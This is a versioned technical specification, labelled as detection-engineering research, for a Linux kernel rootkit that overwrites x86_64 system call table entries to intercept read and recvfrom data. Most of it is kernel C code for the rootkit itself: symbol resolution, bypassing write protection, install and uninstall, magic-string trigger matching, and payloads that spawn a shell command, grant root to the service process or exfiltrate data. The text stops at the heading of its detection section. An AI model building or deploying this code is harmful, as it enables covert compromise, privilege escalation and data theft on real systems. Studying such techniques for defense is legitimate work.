# Technical Specification: System Call Table Hooking for Data Interception

## White-Room Engineering Analysis Document — v2.0

**Classification:** Security Research / Threat Modeling
**Purpose:** Defensive Understanding & Detection Engineering
**Technique Mapping:** MITRE ATT&CK T1179, T1014, T1055.008

---

## 0. Revision Summary (v1.1 → v2.0)

v1.1's `[REVISION NOTE]` claimed fixes that did not survive review: two "FIXED"
items (the allocation counter and the drop logic) were themselves defective,
and several sections contained factual errors (syscall numbers, kernel API
eras) that made both the attack model and the detection model wrong.

v2.0 changes, traceable via `[F-xx]` tags and Appendix C:

| Category | Summary |
|---|---|
| Factual | x86_64 syscall numbers corrected (recvfrom=45, readv=19); i386 has no direct `recvfrom`; no `recv` syscall exists |
| Lifecycle | config allocation/init, install verification, double-install guard, uninstall/drain path — all previously missing |
| Concurrency | admission control replaces the self-defeating cumulative counter; atomics for all shared counters |
| Logic | drop semantics documented honestly (EOF, not "packet drop"); payload execution contexts corrected; payload data lifetime fixed |
| Premise | TLS ciphertext limitation promoted from a footnote to a scope statement; modern-kernel applicability (≥6.12) documented |
| Detection | trusted-anchor requirement, `%p` hashing, eBPF rewritten on a stable tracepoint, CR0 detection that actually observes the attack |

**Applicability note (read first):** on x86_64, kernels ≈6.12+ dispatch native
syscalls through a generated `switch` statement rather than `sys_call_table`
(verify against your target's source). SCT overwrites are therefore a
*historical* technique for current x86_64. The relevant threat surface is
long-lived/EOL kernels (4.x–5.x distro kernels, embedded, appliances) — which
is precisely where these rootkits persist and where detection engineering
matters. All code below is specification-grade: type-correct and
error-pathed, but to be built against a specific kernel tree.

---

## 1. Overview and Applicability

This specification documents a kernel-level data interception technique that
modifies the Linux system call table to inspect and selectively alter data
delivered to user-space. It is written for detection engineering and
countermeasure development.

### 1.1 Scope Limitations (must be stated up front)

1. **TLS opacity.** With userspace TLS (OpenSSL, standard nginx), data at the
   `read()` boundary is **ciphertext**. Content triggers (magic strings,
   headers) never match. Interception of content requires plaintext protocols
   or kernel TLS offload (kTLS-RX). v1.1's own data-flow diagram contradicted
   its own footnote; v2.0 corrects the diagram instead (§7). [F-39]
2. **Kernel dispatch drift.** x86_64 ≥ ~6.12 uses switch-based dispatch
   (verify); SCT hooking is ineffective there. KCFI/FineIBT add indirect-call
   constraints on 5.12+/6.2+ clang-built kernels.
3. **Coverage holes are structural.** `recvmsg`/`readv`/`pread*`, 32-bit compat
   processes (separate `ia32_sys_call_table`), `io_uring` (own opcode
   dispatch; SQPOLL can skip syscall entry), and `splice`-family calls bypass
   a read/recvfrom SCT hook. See §5.6.
4. **Module loading controls.** `CONFIG_MODULE_SIG_FORCE`, lockdown
   (integrity mode), and `CONFIG_MODULES=n` prevent the load entirely; the
   technique presumes an already-compromised host that can load code.

---

## 2. Architecture

```
┌─────────────────────────────────────────────────────────────┐
│ USER SPACE                                                  │
│  app → libc read()/recv()/recvfrom() → syscall instruction  │
│  (libc implements recv() as recvfrom — there is no `recv`   │
│   syscall on x86_64)                     [F-09]             │
└───────────────────────────┬─────────────────────────────────┘
                            ▼
┌─────────────────────────────────────────────────────────────┐
│ KERNEL SPACE                                                │
│  entry_SYSCALL_64 → do_syscall_64 → sys_call_table[]        │
│     [0]=read   [1]=write   [45]=recvfrom   [19]=readv       │
│                                       [F-08]                │
│  AFTER HOOK:                                                │
│     [0]  → hooked_sys_read                                  │
│     [45] → hooked_sys_recvfrom                              │
│                                                             │
│  HOOK HANDLER:                                              │
│    filter(tgid) → orig() → admission(§5.4) →                │
│    bounded-window scan(§5.2) → magic? →                     │
│        ├─ no:  return orig result (fail-open throughout)    │
│        └─ yes: payload (deferred) / modify / drop           │
│                                                             │
│  STATE: struct hook_config (heap, module-owned; see §4.2    │
│  for lifecycle — v1.1 never allocated it)     [F-01]        │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. Data Structures

### 3.1 Linux System Call Table (native, x86_64)

```c
/* arch/x86/entry/syscall_64.c — the table is const and lives in .rodata,
 * write-protected at boot under CONFIG_STRICT_KERNEL_RWX. */
typedef long (*sys_call_ptr_t)(const struct pt_regs *);
extern const sys_call_ptr_t sys_call_table[];

/* Correct indices (v1.1 had 59/62/63/65 — execve/kill/uname/semctl): */
/* sys_call_table[0]  = __x64_sys_read      [F-08]
 * sys_call_table[1]  = __x64_sys_write
 * sys_call_table[45] = __x64_sys_recvfrom
 * sys_call_table[19] = __x64_sys_readv
 * x32 ABI entries (nr >= 512) share this table where supported.
 * 32-bit compat processes dispatch via the *separate*
 * ia32_sys_call_table when CONFIG_IA32_EMULATION is enabled. [F-40] */
```

### 3.2 Hook Control Structure (v2.0)

```c
#define MAGIC_MAX_LEN      64
#define MAX_HOOKED_TGIDS   8

/* Action bits — independent of payload selection. v1.1 overloaded a single
 * payload_flags byte as both an enum (0/1/2) and a bitmask, which allowed
 * "drop" to alias with a payload bit.                              [F-26] */
#define FLAG_MODIFY_BUFFER   BIT(0)
#define FLAG_DROP_DATA       BIT(1)   /* semantics: see §5.2 — EOF, not packet drop */

/* Payload selectors — exactly one at a time (one-hot). */
enum payload_select {
    PAYLOAD_NONE = 0,
    PAYLOAD_USERMODE_HELPER,   /* spawn process via call_usermodehelper (deferred) */
    PAYLOAD_CRED_MOD,          /* commit_creds() on the reading task (inline only) */
    PAYLOAD_EXFIL,             /* copy out bytes following the match (deferred) */
    PAYLOAD_STAGE,             /* load a follow-on module (out of scope) */
};

/* MODE_EXACT 0 / MODE_PREFIX 1 / MODE_CONTAINS 2 / MODE_OFFSET 3.
 * v1.1's comment promised a "regex" mode that never existed.        [F-28] */

struct hook_config {
    sys_call_ptr_t   orig_sys_read;
    sys_call_ptr_t   orig_sys_recvfrom;

    pid_t            target_tgids[MAX_HOOKED_TGIDS]; /* tgid, NOT tid  [F-13] */
    uint32_t         tgid_count;
    u64              target_cgid;      /* optional cgroup-v2 id: PID-reuse-proof */

    uint8_t          trigger_magic[MAGIC_MAX_LEN];
    uint32_t         magic_len;        /* was hardcoded 16 while examples were 18 [F-25] */
    uint32_t         trigger_offset;
    uint32_t         trigger_mode;     /* MODE_* */
    atomic_long_t    trigger_count;    /* was a racy non-atomic ++       [F-10] */

    enum payload_select payload;
    uint8_t          action_flags;     /* FLAG_* */

    /* Admission control (§5.4) — replaces v1.1's cumulative-allocation
     * counter, which (a) counted failed allocations as allocated bytes,
     * (b) was monotonically increasing so it permanently disabled the
     * hook once crossed, and (c) reset with a read-then-set TOCTOU. [F-11/16/17] */
    atomic_long_t    in_flight;        /* concurrent inspections */
    atomic_long_t    in_flight_bytes;  /* bytes held concurrently */
    atomic_long_t    fail_count;       /* allocation failures in window */
    unsigned long    fail_window_start;
    atomic_t         degraded;         /* cool-down latch */
    unsigned long    degraded_until;
    u64              timestamp_installed;
};

/* v1.1 placed this pointer in a custom ELF section via
 * __attribute__((section(".hidden"))). Section placement hides nothing:
 * module sections are enumerable via /sys/module/<mod>/sections. Removed.
 * Plain module-static storage, allocated in §4.2.                  [F-01] */
static struct hook_config *cfg;
```

### 3.3 System Call Numbers (x86_64 — corrected)

```c
#define __NR_read            0
#define __NR_write           1
#define __NR_pread64        17
#define __NR_readv          19      /* v1.1 said 65 (semctl)   [F-08] */
#define __NR_recvfrom       45      /* v1.1 said 62 (kill) / 59 (execve) */
#define __NR_recvmsg        47
#define __NR_splice        275
#define __NR_vmsplice      278
#define __NR_preadv        295
#define __NR_recvmmsg      299
#define __NR_io_uring_setup   425
#define __NR_io_uring_enter   426
```

---

## 4. Hook Installation and Lifecycle

### 4.1 Memory Protection Bypass

Two methods are specified. v1.1's Method 2 (manual PTE walk with a literal
`...` placeholder, no restore path) and Method 3 (physmap alias via
`ioremap`) are **removed**: `ioremap()` on System RAM is refused/warned on
modern x86, and writing through a UC alias while the linear mapping is WB is
mixed-memory-type undefined behavior — other CPUs can keep dispatching
through stale cached entries. They are retained as *analysis of why attacks
using them are unreliable*, not as methods. [F-03/F-04]

**Method A (preferred): exported page-attribute API.**

```c
/* set_memory_rw() is module-exported, handles the linear-map alias and TLB
 * flush correctly, and can be paired with set_memory_ro() to restore.
 * On hardened configs it may refuse to mutate .rodata — fall back to
 * Method B. Both methods are detectable (§9.2, §11). */
static int make_table_writable(unsigned long addr, int npages)
{
    return set_memory_rw(addr, npages);
}
```

**Method B: CR0.WP inside `stop_machine()`.**

CR0 is a **per-CPU** register. v1.1 toggled it on one CPU while others ran —
the actual bug `stop_machine()` was added to fix. The correct construction:
the callback runs on one CPU while all others are quiesced with interrupts
disabled; only the writing CPU needs WP clear, and the stopped CPUs cannot
observe a half-written entry. The `smp_wmb()` barriers from v1.1 are removed:
they are redundant under `stop_machine()` (no concurrent observers) — they
were cargo cult, though harmless, on x86. [F-13 note]

```c
static int __swap_entries(void *unused)
{
    unsigned long cr0 = read_cr0();

    asm volatile("mov %0, %%cr0" :: "r"(cr0 & ~X86_CR0_WP));
    sys_call_table[__NR_read]     = (sys_call_ptr_t)hooked_sys_read;
    sys_call_table[__NR_recvfrom] = (sys_call_ptr_t)hooked_sys_recvfrom;
    asm volatile("mov %0, %%cr0" :: "r"(cr0));   /* restore exact value */
    return 0;
}
```

### 4.2 Installation (complete lifecycle — v1.1 had none)

```c
static int install_hooks(void)
{
    unsigned long sct, sys_read_addr;
    int npages, ret;

    if (cfg)                                    /* already installed  [F-15] */
        return -EBUSY;

    ret = resolve_symbols(&sct, &sys_read_addr);
    if (ret)
        return ret;

    /* Refuse to hook over someone else's hook (v1.1 would have saved a
     * hooked pointer as "original" → infinite recursion).           [F-15] */
    if (((sys_call_ptr_t *)sct)[__NR_read] != (sys_call_ptr_t)sys_read_addr)
        return -EEXIST;

    cfg = kzalloc(sizeof(*cfg), GFP_KERNEL);    /* v1.1: never allocated  [F-01] */
    if (!cfg)
        return -ENOMEM;
    init_hook_config();                         /* v1.1: never called     [F-01] */

    cfg->orig_sys_read     = sys_call_table[__NR_read];
    cfg->orig_sys_recvfrom = sys_call_table[__NR_recvfrom];

    npages = PAGE_ALIGN(1 + NR_syscalls * sizeof(void *)) >> PAGE_SHIFT;
    ret = make_table_writable((unsigned long)sys_call_table, npages);
    if (ret == 0) {
        ret = stop_machine(__swap_entries, NULL, NULL);
        set_memory_ro((unsigned long)sys_call_table, npages);
    } else {
        ret = stop_machine(__swap_entries, NULL, NULL);  /* Method B path */
    }
    if (ret)
        goto fail;

    /* Readback verification (v1.1 assumed success).                 [F-07] */
    if (sys_call_table[__NR_read]     != (sys_call_ptr_t)hooked_sys_read ||
        sys_call_table[__NR_recvfrom] != (sys_call_ptr_t)hooked_sys_recvfrom) {
        stop_machine(__restore_entries, NULL, NULL);
        goto fail;
    }

    cfg->timestamp_installed = ktime_get_real_ns();
    return 0;
fail:
    kfree(cfg);
    cfg = NULL;
    return ret ?: -EIO;
}
```

### 4.3 `sys_call_table` Resolution

`kallsyms_lookup_name()` is **unexported since v5.7** — including in the
v1.1 test environment (5.15), where Method 1 could not link. The kprobe
registration trick resolves it; note that this registration is *itself* a
first-class IOC (§11). [F-02]

```c
static int resolve_symbols(unsigned long *sct_out, unsigned long *sys_read_out)
{
    static unsigned long (*kln)(const char *);
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    unsigned long sct, expected;
    int ret;

    ret = register_kprobe(&kp);
    if (ret)
        return ret;
    kln = (unsigned long (*)(const char *))kp.addr;
    unregister_kprobe(&kp);

    sct = kln("sys_call_table");
    if (!sct)
        return -ENOENT;

    /* Independent second resolution for validation. v1.1's pattern
     * scanner returned an unvalidated candidate that was then written
     * through. The x86_64 table entries point at __x64_* wrappers —
     * name is kernel-version specific; verify per tree.            [F-07] */
    expected = kln("__x64_sys_read");
    if (expected &&
        ((sys_call_ptr_t *)sct)[__NR_read] != (sys_call_ptr_t)expected)
        return -EINVAL;      /* wrong candidate or table already modified */

    *sct_out = sct;
    *sys_read_out = expected;
    return 0;
}
```

**/proc/kallsyms method — fixed parser.** v1.1 read fixed 255-byte chunks,
never NUL-terminated them, and `strstr()`'d across arbitrary chunk
boundaries — lines containing ` sys_call_table` that straddled two reads
were never matched, and uninitialized stack was read. The corrected reader
is line-oriented and terminates every line. Requires `kptr_restrict=0`, or
`CAP_SYSLOG` with `kptr_restrict=1`; addresses print as 0 otherwise. [F-06/F-28]

```c
static unsigned long find_sct_via_proc(void)
{
    char acc[128], chunk[64];
    size_t acc_len = 0;
    unsigned long addr = 0;
    loff_t pos = 0;
    ssize_t n, i;
    struct file *f = filp_open("/proc/kallsyms", O_RDONLY, 0);

    if (IS_ERR(f))
        return 0;

    while ((n = kernel_read(f, chunk, sizeof(chunk), &pos)) > 0) {
        for (i = 0; i < n; i++) {
            if (chunk[i] == '\n') {
                acc[acc_len] = '\0';
                if (strstr(acc, " sys_call_table") &&
                    sscanf(acc, "%lx", &addr) == 1)
                    goto out;
                acc_len = 0;
            } else if (acc_len < sizeof(acc) - 1) {
                acc[acc_len++] = chunk[i];
            } else {
                acc_len = 0;            /* overlong line: skip */
            }
        }
    }
out:
    filp_close(f, NULL);
    return addr;
}
```

**Pattern-scan method — downgraded to last resort.** v1.1 scanned from
`entry_SYSCALL_64`, but post-4.17 the table LEA lives in `do_syscall_64`;
byte-scanning without instruction decoding matches displacement bytes
inside unrelated instructions. If used: resolve `do_syscall_64` via kprobe,
decode the `lea rip+disp32` sites with a real disassembler, and validate the
candidate exactly as in `resolve_symbols()` before any write. Prefer the
kallsyms method.

### 4.4 Uninstall (v1.1 had no teardown — module unload would leave the
table pointing into freed module text → panic on next syscall) [F-14]

```c
static int __restore_entries(void *unused)
{
    unsigned long cr0 = read_cr0();
    asm volatile("mov %0, %%cr0" :: "r"(cr0 & ~X86_CR0_WP));
    sys_call_table[__NR_read]     = cfg->orig_sys_read;
    sys_call_table[__NR_recvfrom] = cfg->orig_sys_recvfrom;
    asm volatile("mov %0, %%cr0" :: "r"(cr0));
    return 0;
}

static void uninstall_hooks(void)
{
    long timeout = HZ;

    if (!cfg)
        return;
    stop_machine(__restore_entries, NULL, NULL);

    /* Drain in-flight inspections. synchronize_rcu() alone is not
     * sufficient: a task preempted inside the hook is not an RCU reader.
     * Best-effort bounded wait; residual risk (preempted task in module
     * text at free time) is documented, not hidden.                [F-14] */
    while (atomic_long_read(&cfg->in_flight) > 0 && timeout--)
        schedule_timeout_uninterruptible(1);
    WARN_ON(atomic_long_read(&cfg->in_flight) > 0);

    kfree(cfg);
    cfg = NULL;
}
```

---

## 5. Hook Handler Implementation

### 5.1 Primary Hook: `hooked_sys_read`

```c
static long hooked_sys_read(const struct pt_regs *regs)
{
    unsigned int fd  = regs->di;
    char __user *buf = (char __user *)regs->si;
    struct file *file;
    long ret;

    if (!is_target_process(current))
        return cfg->orig_sys_read(regs);

    file = fget(fd);
    if (file) {
        bool is_sock = S_ISSOCK(file_inode(file)->i_mode);
        fput(file);
        if (!is_sock)                    /* v1.1 was socket-only here but
                                           claimed file coverage elsewhere */
            return cfg->orig_sys_read(regs);
    }

    ret = cfg->orig_sys_read(regs);
    if (ret <= 0)
        return ret;

    if (!inspection_admitted())          /* fail open — availability first */
        return ret;

    ret = inspect_and_act(buf, (size_t)ret, fd);
    inspection_leave();
    return ret;
}

/* v1.1 promised hooked_sys_recvfrom in its diagrams but never defined it. */
static long hooked_sys_recvfrom(const struct pt_regs *regs)
{
    unsigned int fd  = regs->di;
    char __user *buf = (char __user *)regs->si;
    long ret;                            /* flags r10, addr r8, addrlen r9
                                            forwarded via regs to orig */

    if (!is_target_process(current))
        return cfg->orig_sys_recvfrom(regs);

    ret = cfg->orig_sys_recvfrom(regs);
    if (ret <= 0)
        return ret;

    if (!inspection_admitted())
        return ret;
    ret = inspect_and_act(buf, (size_t)ret, fd);
    inspection_leave();
    return ret;
}
```

### 5.2 Bounded-Window Inspection Engine

v1.1 allocated `ret` bytes per read (up to a 256 KB order-6 allocation in the
hot path — fragmentation-prone and a latency source) and skipped inspection
entirely above a dynamic threshold, which created a *structural bypass* (any
trigger padded past the threshold is uninspectable — v1.1's own §9.1
admitted this). v2.0 replaces both with **constant-memory windowed
scanning**: every read is inspected (up to a CPU-bound cap), memory use is
bounded and admission-controlled, and the threshold-evasion class of bypass
is eliminated. [F-17/F-20/F-36]

```c
#define WINDOW_SZ           8192      /* one order-1 allocation         */
#define MAX_SCAN_PER_CALL   (1UL << 20) /* CPU DoS bound; residual gap
                                           documented below              */

static long inspect_and_act(char __user *ubuf, size_t count, int fd)
{
    uint8_t *win;
    size_t winsz, base = 0, scanned = 0, mlen = cfg->magic_len, moff;
    long ret = (long)count;

    win = window_alloc(&winsz);         /* kvmalloc; §5.4 accounting     */
    if (!win)
        return ret;                     /* fail open                     */

    while (base < count && scanned < MAX_SCAN_PER_CALL) {
        size_t copy = min(count - base, winsz);

        if (copy_from_user(win, ubuf + base, copy))
            break;                      /* fault: fail open              */

        if (find_magic(win, copy, &moff)) {
            handle_magic_trigger(win + moff, copy - moff, fd);

            if (cfg->action_flags & FLAG_MODIFY_BUFFER) {
                /* Checked copy (v1.1 ignored the return value → torn
                 * buffer delivered as a successful read). On partial
                 * failure: log; original bytes were already delivered
                 * by the orig call, so we still return ret.        [F-21] */
                sanitize_span(win + moff, copy - moff);
                if (copy_to_user(ubuf + base + moff, win + moff,
                                 copy - moff))
                    pr_warn_once("hook: torn modify write\n");
            }

            if (cfg->action_flags & FLAG_DROP_DATA) {
                /* DROP SEMANTICS (documented honestly — v1.1 called this
                 * "drop packet", which does not exist at this layer):
                 * the orig call has ALREADY placed `count` bytes in the
                 * user buffer. We wipe best-effort and signal EOF. TCP
                 * is a byte stream: the app sees a clean mid-stream
                 * close, the TLS record layer desynchronizes, and the
                 * event is visible to both endpoints and network
                 * observers. Selective stream suppression must happen
                 * before data is queued to the socket (sk_filter /
                 * receive-path), i.e., at a different layer.       [F-21]
                 * clear_user() is best-effort: a racing consumer
                 * thread can read the magic before the wipe.       */
                clear_user(ubuf, count);
                window_free(win, winsz);
                return 0;               /* EOF; -ECONNRESET is the loud alternative */
            }
            break;
        }

        scanned += copy;
        if (copy < mlen)
            break;                      /* fragment too short to ever match */
        /* Window overlap: a magic straddling the window boundary is
         * still matched. (v1.1 could only match within a single
         * read-chunk copy.)                                       [F-36] */
        base += copy - (mlen - 1);
    }

    window_free(win, winsz);
    return ret;
}
```

**Documented residual gaps (not hidden):** (a) bytes beyond
`MAX_SCAN_PER_CALL` in a single huge read are not scanned — the bound exists
to cap per-syscall CPU; (b) a magic straddling **two separate `read()`
calls** is not matched — closing that requires per-fd carry-over state
(xarray keyed by fd, 15-byte tail) and is specified as an option, not
implemented; (c) partial `copy_from_user` faults skip the rest of the
buffer. All three are test cases in §12.

### 5.3 Magic Sequence Detection

```c
#define MODE_EXACT      0
#define MODE_PREFIX     1
#define MODE_CONTAINS   2
#define MODE_OFFSET     3

static bool find_magic(const uint8_t *data, size_t len, size_t *match_off)
{
    const uint8_t *magic = cfg->trigger_magic;
    size_t mlen = cfg->magic_len;

    if (len < mlen)
        return false;

    switch (cfg->trigger_mode) {
    case MODE_EXACT:
        if (len == mlen && !memcmp(data, magic, mlen)) {
            *match_off = 0;
            return true;
        }
        return false;
    case MODE_PREFIX:
        if (!memcmp(data, magic, mlen)) {
            *match_off = 0;
            return true;
        }
        return false;
    case MODE_CONTAINS: {
        /* memmem is in lib/string.c; if not exported on the target
         * kernel, substitute a manual search loop. */
        const uint8_t *p = memmem(data, len, magic, mlen);
        if (p) {
            *match_off = p - data;
            return true;
        }
        return false;
    }
    case MODE_OFFSET:
        /* wrap-safe bounds check (v1.1's offset+mlen could wrap on
         * 32-bit) — also fixed in §5.4's arithmetic.             [F-19] */
        if (cfg->trigger_offset > len || mlen > len - cfg->trigger_offset)
            return false;
        if (!memcmp(data + cfg->trigger_offset, magic, mlen)) {
            *match_off = cfg->trigger_offset;
            return true;
        }
        return false;
    }
    return false;
}
```

### 5.4 Admission Control (replaces v1.1's "dynamic size threshold")

v1.1's mechanism was broken in five ways, all fixed by replacing the state
variable: it added `ret` to a counter named `total_allocated` **on the
allocation-failure path** (counting bytes never allocated) [F-16]; it was
cumulative and monotonic, so `alloc_threshold` (16 MB) was crossed once and
the threshold collapsed to minimum **forever** — the "DoS protection"
permanently disabled the interception [F-17]; its reset was a
read-then-set TOCTOU losing concurrent updates [F-11]; it used
`si.freeram`, which sits at a few percent on any healthy Linux box (memory
lives in reclaimable page cache) — pinning the threshold to minimum as the
*normal* case [F-18]; and it never bounded the actual exposure, which is
concurrent in-flight allocations, not cumulative history. The 32-bit
`freeram * 100` overflow is moot in the replacement. [F-19]

v2.0 controls what actually matters: **concurrency** and **failure rate**,
with hysteresis.

```c
#define MAX_INFLIGHT        64
#define MAX_INFLIGHT_BYTES  (8UL << 20)   /* 8 MB hard ceiling */
#define FAIL_HYSTERESIS     32
#define FAIL_WINDOW         (HZ / 2)
#define DEGRADE_COOLDOWN    (5 * HZ)

static bool inspection_admitted(void)
{
    if (atomic_read(&cfg->degraded) &&
        time_before(jiffies, cfg->degraded_until))
        return false;                       /* cool-down: fail open */
    return atomic_long_inc_return(&cfg->in_flight) <= MAX_INFLIGHT
        ? true
        : (atomic_long_dec(&cfg->in_flight), false);
}

static void inspection_leave(void)
{
    atomic_long_dec(&cfg->in_flight);
}

/* Note: fail_window_start is read/written racily. Acceptable: it gates
 * behavior, not accounting — approximate window reset is fine. Contrast
 * v1.1, where the racy counter *was* the accounting. */
static void record_alloc_failure(void)
{
    if (time_after(jiffies, cfg->fail_window_start + FAIL_WINDOW)) {
        cfg->fail_window_start = jiffies;
        atomic_long_set(&cfg->fail_count, 0);
    }
    if (atomic_long_inc_return(&cfg->fail_count) > FAIL_HYSTERESIS) {
        atomic_set(&cfg->degraded, 1);
        cfg->degraded_until = jiffies + DEGRADE_COOLDOWN;
        atomic_long_set(&cfg->fail_count, 0);
    }
}

/* kvmalloc: falls back to vmalloc above the slab's comfort zone; v1.1's
 * kmalloc(ret) demanded order-6+ pages in the syscall hot path.  [F-20] */
static uint8_t *window_alloc(size_t *actual)
{
    uint8_t *w = kvmalloc(WINDOW_SZ, GFP_KERNEL);

    if (!w) {
        record_alloc_failure();
        return NULL;
    }
    if (atomic_long_add_return(WINDOW_SZ, &cfg->in_flight_bytes)
        > MAX_INFLIGHT_BYTES) {
        atomic_long_sub(WINDOW_SZ, &cfg->in_flight_bytes);
        kvfree(w);
        return NULL;                        /* fail open */
    }
    *actual = WINDOW_SZ;
    return w;
}

static void window_free(uint8_t *w, size_t sz)
{
    atomic_long_sub(sz, &cfg->in_flight_bytes);
    kvfree(w);
}

static void init_hook_config(void)          /* called from install_hooks [F-01] */
{
    atomic_long_set(&cfg->in_flight, 0);
    atomic_long_set(&cfg->in_flight_bytes, 0);
    atomic_long_set(&cfg->fail_count, 0);
    atomic_long_set(&cfg->trigger_count, 0);
    atomic_set(&cfg->degraded, 0);
    cfg->fail_window_start = jiffies;
    cfg->degraded_until = 0;
    cfg->magic_len = 16;                    /* config-provisioned, ≤ MAGIC_MAX_LEN */
    /* trigger_magic, targets, mode, payload: provisioned via config
     * channel — out of scope for this document. */
}
```

### 5.5 Process Filtering

```c
static bool is_target_process(struct task_struct *t)
{
    int i;

    /* tgid, not pid: pid is the *thread* id. v1.1's pid whitelist missed
     * every worker thread of java/node/nginx — the primary readers in
     * its own threat model.                                      [F-13] */
    if (cfg->tgid_count) {
        for (i = 0; i < cfg->tgid_count; i++)
            if (task_tgid_nr(t) == cfg->target_tgids[i])
                return true;
    }

    /* cgroup-v2 id match: resistant to PID reuse and comm spoofing.
     * Resolve the id from the task's cgroup kernfs node; the exact API
     * depends on cgroup version. (PID reuse silently grants interception
     * to a recycled pid under v1.1's design.)                    [F-13] */
    if (cfg->target_cgid && task_cgroup_id_matches(t, cfg->target_cgid))
        return true;

    /* comm matching: heuristic only. comm is writable by the task itself
     * (PR_SET_NAME) — trivially spoofed. Retained for lab use; production
     * threat models should treat comm as an *indicator*, not a filter. */
    if (!strncmp(t->comm, "nginx",   TASK_COMM_LEN) ||
        !strncmp(t->comm, "apache2", TASK_COMM_LEN) ||
        !strncmp(t->comm, "httpd",   TASK_COMM_LEN) ||
        !strncmp(t->comm, "curl",    TASK_COMM_LEN))
        return true;

    return false;
}
```

### 5.6 Coverage Matrix (new — v1.1 silently claimed more coverage than it had)

| Data vector | Hooked by read/recvfrom SCT hook? | Notes |
|---|---|---|
| `read(2)` | **yes** | |
| `recvfrom(2)` (and libc `recv`) | **yes** | no `recv` syscall exists [F-09] |
| `recvmsg(2)`, `recvmmsg(2)` | no | same hook pattern applies; v1.1 defined `__NR_recvmmsg` and never used it |
| `readv/preadv/pread64` | no | v1.1 saved `orig_sys_readv` and never installed it |
| 32-bit compat processes | no | dispatch via separate `ia32_sys_call_table` |
| x32 ABI | partial | entries ≥ 512 share the x86_64 table where supported |
| `io_uring` | **no** | own opcode dispatch; SQPOLL may issue ops without any syscall |
| `splice`/`vmsplice` | no | no user-space copy occurs |
| lower layers (vfs_read, sock_recvmsg) | n/a | alternative hook layer — see §8 |

For detection engineering this table matters in reverse: **the gaps are where
traffic can be moved to evade an SCT hook, and also where legitimate
high-performance I/O lives** — treat anomalous migration of a workload onto
`splice`/`io_uring` as a weak behavioral signal only.

---

## 6. Payload Execution Framework

v1.1's payloads were non-functional as written. v2.0 keeps them **conceptual**
with correct execution-context rules — the errors were instructive and are
preserved as detection rationale.

**Rule 1 — never execute a payload inline in the read path.** v1.1 used
`call_usermodehelper(..., UMH_WAIT_PROC)`, which blocks until the spawned
program *exits* — an nginx worker parked inside `read()` for the lifetime of
a reverse shell is a watchdog-visible DoS and matches v1.1's own §11.2 IOC
row ("Usermodehelper calls"). [F-22]

```c
static DECLARE_WORK(trigger_work, trigger_work_fn);

static void handle_magic_trigger(const uint8_t *match, size_t avail, int fd)
{
    if (atomic_long_inc_return(&cfg->trigger_count) < REQUIRED_TRIGGERS)
        return;                                /* atomic; was ++   [F-10] */

    switch (cfg->payload) {
    case PAYLOAD_USERMODE_HELPER:
        queue_work(system_unbound_wq, &trigger_work);   /* deferred */
        break;
    case PAYLOAD_CRED_MOD:
        /* commit_creds() affects *current* — the victim server process.
         * Only correct when executed inline (a kworker's current is the
         * kworker). Consequence, stated plainly: this grants root to the
         * service process, is visible in /proc/<pid>/status and the audit
         * subsystem, and is a high-signal detection, not a stealth
         * action.                                                [F-23] */
        break;
    case PAYLOAD_EXFIL:
        /* Data must be duplicated BEFORE the inspection window is freed
         * (v1.1 deferred against a buffer it then kfree'd, and sliced
         * from offset 0 while MODE_CONTAINS can match anywhere — the
         * payload-relative offset must be the match offset).  [F-24/F-27] */
        queue_exfil(match + cfg->magic_len, avail - cfg->magic_len);
        break;
    default:
        break;
    }
    atomic_long_set(&cfg->trigger_count, 0);
}

static int spawn_helper(void)
{
    char *argv[] = { "/bin/sh", "-c", CMDSPEC, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    /* UMH_NO_WAIT: fire-and-forget. UMH_WAIT_EXEC if exit status needed.
     * UMH_WAIT_PROC (v1.1) blocks the caller for the child's lifetime. */
    return call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
}
```

**Removed:** v1.1's `kernel_thread_payload` / `do_execve()` kthread path —
the 4-argument `do_execve()` prototype predates ~2.6.39 refactors, and a raw
kthread has no `->fs`/user context to exec into; `call_usermodehelper`
exists precisely because that path does not work. [F-05]

**Removed (analysis only):** v1.1's `PAYLOAD_MEMEXEC`. Kernel heap pages are
NX under `CONFIG_STRICT_KERNEL_RWX`; executing from a kmalloc'd buffer
faults. Making it work requires allocating executable kernel memory, which
module locking, lockdown, and IBT/FineIBT all oppose — each attempt is
itself a detection artifact. Retained in the threat model as an *attempted*
behavior with its own IOCs. [F-24]

---

## 7. Data Flow (corrected — the v1.1 diagram showed cleartext it had
already admitted it could not see) [F-39]

```
NETWORK → NIC → TCP/IP → SOCKET BUFFER
   │
   ├── userspace TLS (OpenSSL/nginx): buffer holds
   │   [TLS record][CIPHERTEXT][MAC] → magic can never match. Hook is inert.
   │
   └── kTLS-RX offload or plaintext: buffer holds cleartext
       → hook can inspect.

read()/recvfrom() ──► HOOK
   1. tgid/cgroup filter      ──no──► orig, return
   2. orig call: ret bytes ALREADY in user buffer
   3. admission control (in-flight/failure gates) ──deny──► fail open
   4. bounded window scan (8 KB windows, boundary overlap)
        magic? ──no──► return ret
                ──yes─► payload (deferred, never inline)
                        / modify (checked copy_to_user, torn-write logged)
                        / drop   (clear_user + return 0 → EOF; loud by nature)
   ▼
APPLICATION BUFFER — modified bytes only in kTLS/plaintext case
```

---

## 8. Evasion vs. Detection Reality (rewritten)

v1.1's §8.3 spoofed `read()` results for rkhunter/chkrootkit/lynis/Volatility
— those tools read files from userspace and never probe the syscall table
through the victim's read path, and v1.1's own hook (socket-only, §5.1)
would never have seen their file reads anyway. Removed. [F-29] The realistic
evasion set, with honest detection status:

| Evasion | Reality | Detection |
|---|---|---|
| Hide module from module list (`list_del`) | breaks refcount/accounting | `/proc/modules` vs `/sys/module/*` mismatch; kallsyms module-name entries |
| Tamper with `/proc/kallsyms` output | substitution leaves **symbol-name ↔ address mismatch**; line deletion shifts offsets | boot-time snapshot hash; cross-reference name/addr [F-34] |
| Inline-hook kernel text instead of SCT | modules lack exported `text_poke_bp()`; conflicts with ftrace-owned first bytes and kprobe int3 sites | tracefs kprobe/ftrace listings; W^X scans |
| "kprobe-based hooking (stealthy)" (v1.1 claim) | kprobe registrations are enumerable | `/sys/kernel/tracing/kprobes` |
| Hide in custom ELF section (v1.1 §3.2) | section names hide nothing | `/sys/module/<mod>/sections` |

---

## 9. Detection Engineering

### 9.1 Table Integrity — with a Trust Anchor

